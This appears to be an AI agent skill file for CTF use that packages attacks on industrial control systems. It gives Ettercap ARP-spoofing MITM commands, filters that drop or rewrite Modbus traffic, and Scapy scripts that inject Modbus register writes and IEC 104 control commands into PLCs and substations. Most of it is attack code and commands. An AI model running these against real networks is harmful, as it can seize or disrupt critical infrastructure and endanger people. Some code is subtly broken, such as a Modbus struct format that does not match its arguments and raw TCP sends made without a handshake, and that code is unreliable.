---
name: ics-traffic
description: >
  ICS/SCADA protocol analysis and exploitation using Ettercap MITM, Scapy packet crafting,
  for Modbus/TCP, IEC 104, and DNP3 protocols.
  Trigger: When analyzing ICS protocols, MITM attacks, Modbus, IEC 104, or DNP3.
license: MIT
metadata:
  author: ctf-arsenal
  version: "1.0"
  category: ics-scada
---

# ICS/SCADA Traffic Analysis and Exploitation

## When to Use

Load this skill when:
- Analyzing Industrial Control System (ICS) or SCADA traffic
- Performing MITM attacks on ICS protocols
- Sniffing or injecting Modbus/TCP packets
- Working with IEC 60870-5-104 or DNP3 protocols
- Using Ettercap for ARP spoofing
- Crafting packets with Scapy

## Prerequisites

### Essential Setup

```bash
# Enable IP forwarding (REQUIRED for MITM)
sudo sysctl -w net.ipv4.ip_forward=1

# Verify setting
sysctl net.ipv4.ip_forward  # Should return 1
```

**Why?** Without IP forwarding, intercepted packets won't be forwarded, causing network disruption and failed MITM.

### Check Network Interface

```bash
# List available interfaces
ip link show

# Common interface names
# - eth0: Wired Ethernet
# - wlan0: Wireless
# - enp0s3: VirtualBox/VMware NAT
```

## Ettercap MITM Attacks

### Basic ARP Spoofing

```bash
# Text mode (recommended for CTF)
sudo ettercap -T -i eth0 -M arp:remote /192.168.1.100/ /192.168.1.1/
#                          │          └─target────┘  └─gateway──┘
#                          │
#                          └─ Mode: arp:remote (full duplex MITM)

# GUI mode
sudo ettercap -G
```

### Target Format

| Format | Example | Description |
|--------|---------|-------------|
| Single IP | `/192.168.1.100/` | Single target |
| IP range | `/192.168.1.1-30/` | Range of IPs |
| CIDR notation | `/192.168.1.0/24/` | Entire subnet |
| With ports | `/192.168.1.100/80,443/` | Specific ports |
| MAC + IP | `/00:11:22:33:44:55/192.168.1.100/` | MAC and IP |

### ARP Spoofing Modes

```bash
# Full duplex MITM (recommended)
sudo ettercap -T -i eth0 -M arp:remote /target/ /gateway/

# One-way poisoning
sudo ettercap -T -i eth0 -M arp:oneway /target/ /gateway/

# Auto-detect targets
sudo ettercap -T -i eth0 -M arp
```

### Capture Traffic to PCAP

```bash
# Save intercepted traffic
sudo ettercap -T -i eth0 -M arp:remote /target/ /gateway/ -w capture.pcap

# Analyze with Wireshark
wireshark capture.pcap

# Or with tshark
tshark -r capture.pcap -Y "modbus"
```

## Ettercap Filters

### Filter Compilation

```bash
# Compile filter
sudo etterfilter modbus_filter.etter -o modbus_filter.ef

# Use filter in Ettercap
sudo ettercap -T -i eth0 -M arp:remote /target/ /gateway/ -F modbus_filter.ef
```

### Filter Syntax

```c
// Basic structure
if (condition) {
    action;
}

// Common conditions
if (ip.proto == TCP && tcp.dst == 502) {
    msg("Modbus packet detected\n");
}

// Check specific bytes
if (ip.proto == TCP && tcp.dst == 502) {
    if (DATA.data + 7 == 0x03) {  // Function code 0x03 (Read Holding Registers)
        msg("Read Holding Registers request\n");
    }
}

// Block packets
if (tcp.dst == 502 && DATA.data + 7 == 0x05) {  // Write Single Coil
    drop();
    msg("Blocked Write Single Coil\n");
}

// Modify packets
if (tcp.dst == 502) {
    replace("old_value", "new_value");
}
```

### Example: Modbus Write Blocker

```c
// File: modbus_block_writes.etter
if (ip.proto == TCP && tcp.dst == 502) {
    // Block write commands
    if (DATA.data + 7 == 0x05 ||  // Write Single Coil
        DATA.data + 7 == 0x06 ||  // Write Single Register
        DATA.data + 7 == 0x0F ||  // Write Multiple Coils
        DATA.data + 7 == 0x10) {  // Write Multiple Registers
        drop();
        msg("Blocked Modbus write command\n");
    }
}
```

## Common ICS Protocols and Ports

| Protocol | Port | Description | Use Case |
|----------|------|-------------|----------|
| **Modbus/TCP** | 502 | Industrial protocol | PLCs, SCADA systems |
| **IEC 60870-5-104** | 2404 | Power grid control | Substation automation |
| **DNP3** | 20000 | Utility SCADA | Electric/water utilities |
| **OPC UA** | 4840 | Industrial IoT | Modern SCADA |
| **EtherNet/IP** | 44818 | Rockwell automation | Allen-Bradley PLCs |
| **S7comm** | 102 | Siemens protocol | Siemens PLCs |

## Modbus Protocol

### Modbus Function Codes

| Code | Function | Type | Risk |
|------|----------|------|------|
| `0x01` | Read Coils | Read | Low |
| `0x02` | Read Discrete Inputs | Read | Low |
| `0x03` | Read Holding Registers | Read | Low |
| `0x04` | Read Input Registers | Read | Low |
| `0x05` | Write Single Coil | Write | **High** |
| `0x06` | Write Single Register | Write | **High** |
| `0x0F` | Write Multiple Coils | Write | **High** |
| `0x10` | Write Multiple Registers | Write | **High** |

### Scapy Modbus Sniffer

```python
#!/usr/bin/env python3
"""Sniff Modbus/TCP traffic"""
from scapy.all import *

def modbus_callback(pkt):
    """Process Modbus packets"""
    if TCP in pkt and pkt[TCP].dport == 502:
        payload = bytes(pkt[TCP].payload)
        if len(payload) >= 8:
            func_code = payload[7]
            func_names = {
                0x01: "Read Coils",
                0x03: "Read Holding Registers",
                0x05: "Write Single Coil",
                0x06: "Write Single Register",
                0x0F: "Write Multiple Coils",
                0x10: "Write Multiple Registers",
            }
            func_name = func_names.get(func_code, f"Unknown (0x{func_code:02x})")
            print(f"[Modbus] {pkt[IP].src} -> {pkt[IP].dst} : {func_name}")

# Sniff on interface
sniff(filter="tcp port 502", prn=modbus_callback, store=0)
```

### Scapy Modbus Injector

```python
#!/usr/bin/env python3
"""Inject Modbus/TCP packets"""
from scapy.all import *

def inject_modbus_write(target_ip, register_addr, value):
    """Inject Write Single Register command"""
    # Modbus TCP header
    transaction_id = 0x0001
    protocol_id = 0x0000
    length = 0x0006
    unit_id = 0x01
    
    # Modbus PDU
    function_code = 0x06  # Write Single Register
    
    # Build packet
    modbus_pdu = struct.pack(
        ">HHHBBB H H",
        transaction_id,
        protocol_id,
        length,
        unit_id,
        function_code,
        register_addr,
        value
    )
    
    pkt = IP(dst=target_ip)/TCP(dport=502)/Raw(load=modbus_pdu)
    send(pkt)
    print(f"[+] Injected: Write Register {register_addr} = {value}")

# Usage
inject_modbus_write("192.168.1.100", register_addr=100, value=999)
```

## IEC 60870-5-104 Protocol

### Scapy IEC 104 Sniffer

```python
#!/usr/bin/env python3
"""Sniff IEC 60870-5-104 traffic"""
from scapy.all import *

def iec104_callback(pkt):
    """Process IEC 104 packets"""
    if TCP in pkt and pkt[TCP].dport == 2404:
        payload = bytes(pkt[TCP].payload)
        if len(payload) >= 2:
            start_byte = payload[0]
            if start_byte == 0x68:  # IEC 104 APDU start
                apdu_len = payload[1]
                print(f"[IEC 104] {pkt[IP].src} -> {pkt[IP].dst} : APDU Length {apdu_len}")

sniff(filter="tcp port 2404", prn=iec104_callback, store=0)
```

### IEC 104 Command Injection

```python
#!/usr/bin/env python3
"""Inject IEC 104 control commands"""
from scapy.all import *

def inject_iec104_command(target_ip, ioa, value):
    """Inject single command"""
    # IEC 104 APDU structure (simplified)
    start = 0x68
    length = 0x0E
    control_field = 0x0000
    type_id = 0x2D  # C_SC_NA_1 (Single Command)
    
    apdu = bytes([start, length]) + struct.pack("<H", control_field)
    apdu += bytes([type_id, 0x01, 0x06, 0x00])  # SQ=0, NumIX=1
    apdu += struct.pack("<I", ioa)  # Information Object Address
    apdu += bytes([value & 0xFF])
    
    pkt = IP(dst=target_ip)/TCP(dport=2404)/Raw(load=apdu)
    send(pkt)
    print(f"[+] Injected IEC 104 command: IOA={ioa}, Value={value}")
```

## DNP3 Protocol

### Scapy DNP3 Sniffer

```python
#!/usr/bin/env python3
"""Sniff DNP3 traffic"""
from scapy.all import *

def dnp3_callback(pkt):
    """Process DNP3 packets"""
    if TCP in pkt and pkt[TCP].dport == 20000:
        payload = bytes(pkt[TCP].payload)
        if len(payload) >= 10 and payload[0:2] == b'\x05\x64':
            print(f"[DNP3] {pkt[IP].src} -> {pkt[IP].dst}")

sniff(filter="tcp port 20000", prn=dnp3_callback, store=0)
```

## Practical Tips

### Verify MITM Success

```bash
# On target machine, check ARP table
arp -a

# Look for gateway MAC matching attacker's MAC
# Example output:
# ? (192.168.1.1) at AA:BB:CC:DD:EE:FF [ether] on eth0
#                    └─ Should be attacker's MAC if MITM successful
```

### Restore Network After Attack

```bash
# Ettercap automatically restores ARP on exit (Ctrl+C)

# Manual restore (if needed)
sudo arp -d 192.168.1.1  # Delete poisoned entry
```

### Analyze Captured Traffic

```bash
# Filter Modbus in Wireshark
tcp.port == 502

# Extract Modbus function codes with tshark
tshark -r capture.pcap -Y "modbus" -T fields -e modbus.func_code

# Count packet types
tshark -r capture.pcap -Y "tcp.port == 502" | wc -l
```

## Quick Reference

| Task | Command |
|------|---------|
| Enable IP forward | `sudo sysctl -w net.ipv4.ip_forward=1` |
| Basic ARP spoof | `sudo ettercap -T -i eth0 -M arp:remote /target/ /gw/` |
| Compile filter | `sudo etterfilter filter.etter -o filter.ef` |
| Use filter | `sudo ettercap -T -i eth0 -F filter.ef -M arp:remote ...` |
| Capture PCAP | `sudo ettercap -T -i eth0 -M arp -w capture.pcap` |
| Sniff Modbus | `sudo python3 scapy_scripts/modbus_sniffer.py` |
| Check ARP table | `arp -a` |

## Bundled Resources

### Scapy Scripts

- `scapy_scripts/modbus_sniffer.py` - Modbus/TCP packet sniffer
- `scapy_scripts/modbus_inject.py` - Inject Modbus commands
- `scapy_scripts/modbus_replay.py` - Replay captured Modbus traffic
- `scapy_scripts/iec104_sniffer.py` - IEC 104 packet sniffer
- `scapy_scripts/iec104_inject.py` - IEC 104 command injection
- `scapy_scripts/dnp3_sniffer.py` - DNP3 packet sniffer

### Ettercap Filters

- `ettercap_filters/modbus_filter.etter` - Log Modbus function codes
- `ettercap_filters/modbus_block_writes.etter` - Block Modbus write commands
- `ettercap_filters/modbus_read_only.etter` - Allow only read operations
- `ettercap_filters/iec104_filter.etter` - IEC 104 packet logging
- `ettercap_filters/iec104_block_commands.etter` - Block IEC 104 control
- `ettercap_filters/dnp3_block_commands.etter` - Block DNP3 commands

### References

- `references/ettercap_usage.md` - Comprehensive Ettercap guide
- `references/modbus_quickref.md` - Modbus protocol reference
- `references/ics_ports.md` - ICS protocol port reference

## Keywords

ICS, SCADA, industrial control systems, Modbus, Modbus/TCP, IEC 60870-5-104, IEC 104, DNP3, Ettercap, ARP spoofing, MITM, man in the middle, Scapy, packet injection, PLC, programmable logic controller, protocol analysis, network security, critical infrastructure
